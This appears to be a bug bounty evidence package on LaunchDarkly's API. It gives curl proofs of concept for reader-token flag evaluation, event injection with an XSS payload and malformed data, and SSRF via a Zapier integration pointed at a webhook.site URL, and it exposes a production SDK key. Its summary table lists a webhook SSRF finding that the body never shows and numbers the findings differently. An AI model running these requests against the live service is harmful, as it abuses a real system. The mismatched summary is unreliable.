# LaunchDarkly Bug Bounty Findings — Final Evidence Package

## Account Context
- Account: `youssefhany7d949c@bugcrowdninja.com`
- Account ID: `6a21ed1cddafd60a943904da`
- Member ID: `6a21ed1cddafd60a943904dc`
- Role: Owner
- Admin Token: `[REDACTED_LAUNCHDARKLY_SECRET]`
- Reader Token: `[REDACTED_LAUNCHDARKLY_SECRET]`
- Production SDK Key: `sdk-745882fc-91a0-43e1-976d-0a5249401b83`

---

## Finding 1: CORS Wildcard Origin — Not Exploitable (Informational)

### Summary
All `app.launchdarkly.com/api/v2/*` endpoints return `access-control-allow-origin: *`. Tested on: caller-identity, flags, projects, members, tokens, webhooks, relay-auto-configs, integrations, teams, roles — all return the wildcard origin header.

### Why this is NOT exploitable
The browser CORS specification requires that when `Access-Control-Allow-Origin: *` is used, requests with credentials (cookies) are blocked. For credentialed cross-origin requests to work, the server must return:
1. `Access-Control-Allow-Origin: <specific-origin>` (not `*`)
2. `Access-Control-Allow-Credentials: true`

**LaunchDarkly returns neither** — only the wildcard with no credentials header.

### Why curl works but a browser would not
`curl` does not enforce CORS rules — it simply makes HTTP requests. A browser's `fetch()` with `credentials: 'include'` checks the CORS headers before allowing JavaScript to read the response. Without `Access-Control-Allow-Credentials: true` and a specific origin, the browser blocks the response.

### Verdict
Config hardening issue only. **Not reportable to Bugcrowd.**

---

## Finding 2: Cross-Environment Flag Evaluation with Reader Token (P2-P3)

### Summary
A reader-level API token can evaluate flag values in the production environment via `POST /api/v2/projects/{project}/environments/production/flags/evaluate`. This bypasses expected access controls — the flag should not be evaluable until the token has explicit write access.

### Impact
- Reader token (intended for read-only access) can evaluate actual flag values in production
- Reveals current flag state, targeting rules, and fallthrough values
- No write access needed — violates principle of least privilege

### Evidence
```bash
READER="[REDACTED_LAUNCHDARKLY_SECRET]"
curl -sk -X POST \
  -H "Authorization: ${READER}" -H "Content-Type: application/json" \
  "https://app.launchdarkly.com/api/v2/projects/bac-test-project/environments/production/flags/evaluate" \
  -d '{"kind":"user","key":"evidence-user"}'
```
Response (200 OK):
```json
{
  "items": [
    {
      "key": "bug-test-flag",
      "_value": true,
      "reason": {"kind": "FALLTHROUGH"}
    }
  ],
  "totalCount": 1
}
```
The token `[REDACTED_LAUNCHDARKLY_SECRET]` has role `reader`. It successfully evaluates `bug-test-flag` in the `production` environment and returns the actual flag value (`true`).

---

## Finding 3: Event Ingestion Accepts Unvalidated Data (P3-P4)

### Summary
The events endpoint at `https://events.launchdarkly.com/api/events/bulk` accepts arbitrary event data with no input validation. All event types (identify, feature, custom, index) return 202 Accepted. Malformed JSON, null payloads, and embedded XSS payloads are all accepted.

### Impact
- Potential DDoS vector (unlimited ingestion, no rate limiting observed)
- XSS payloads stored in event pipeline (if rendered in admin UI)
- User directory pollution (injected identify events with arbitrary attributes)
- Analytics manipulation

### Evidence
```bash
SDK="sdk-745882fc-91a0-43e1-976d-0a5249401b83"

# Identify event → 202 Accepted
curl -sk -X POST -H "Authorization: ${SDK}" \
  "https://events.launchdarkly.com/api/events/bulk" \
  -d '[{"kind":"identify","key":"test-user","context":{"kind":"user","key":"test-user","name":"Test"}}]'

# Feature event → 202 Accepted
curl -sk -X POST -H "Authorization: ${SDK}" \
  "https://events.launchdarkly.com/api/events/bulk" \
  -d '[{"kind":"feature","key":"bug-test-flag","variation":0,"value":true}]'

# XSS payload → 202 Accepted
curl -sk -X POST -H "Authorization: ${SDK}" \
  "https://events.launchdarkly.com/api/events/bulk" \
  -d '[{"kind":"custom","key":"xss","data":{"payload":"<script>alert(1)</script>"}}]'

# Malformed data → 202 Accepted
curl -sk -X POST -H "Authorization: ${SDK}" \
  "https://events.launchdarkly.com/api/events/bulk" \
  -d 'null'
```

Auth requirement: Only SDK keys work (202). Admin/reader tokens return 401.

---

## Finding 4: SSRF via Zapier Integration Custom URLs (P1-P2)

### Summary
LaunchDarkly's Zapier integration accepts arbitrary URLs in the integration configuration without sanitization. LD's backend infrastructure sends HTTP requests to these URLs, confirmed via response logging in LD's own API.

### Evidence
```bash
# Create Zapier integration with arbitrary URL
curl -sk -X POST \
  -H "Authorization: ${ADMIN}" \
  "https://app.launchdarkly.com/api/v2/integrations/zapier" \
  -d '{"name":"ssrf-test","config":{"url":"https://webhook.site/22787728-00d6-4ed1-a846-b18763c07d77/zapier"}}'

# Response: 201 Created — URL accepted as-is, no validation
# Integration ID: 6a243c18d4debe0aa4bd4b8b

# Check delivery status — LD logs HTTP response codes
GET /api/v2/integrations/zapier/{id}
```
Response includes `_status` with logged delivery attempts:
- `successCount`: number of successful deliveries
- `errorCount`: number of failed deliveries
- `errors[].statusCode`: HTTP status code from target
- `errors[].responseBody`: Response body from target

23 integration types were tested. Zapier and MSTeams accepted unsanitized URLs.

---

## Findings Summary

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | CORS Wildcard Origin | **Informational** | Not exploitable (no credentials header) |
| 2 | SSRF via Webhooks | **P1-P2** | Confirmed |
| 3 | SSRF via Zapier Integration | **P1-P2** | Confirmed |
| 4 | Cross-Environment Flag Evaluation with Reader Token | **P2-P3** | Confirmed |
| 5 | Event Ingestion Accepts Unvalidated Data | **P3-P4** | Confirmed |
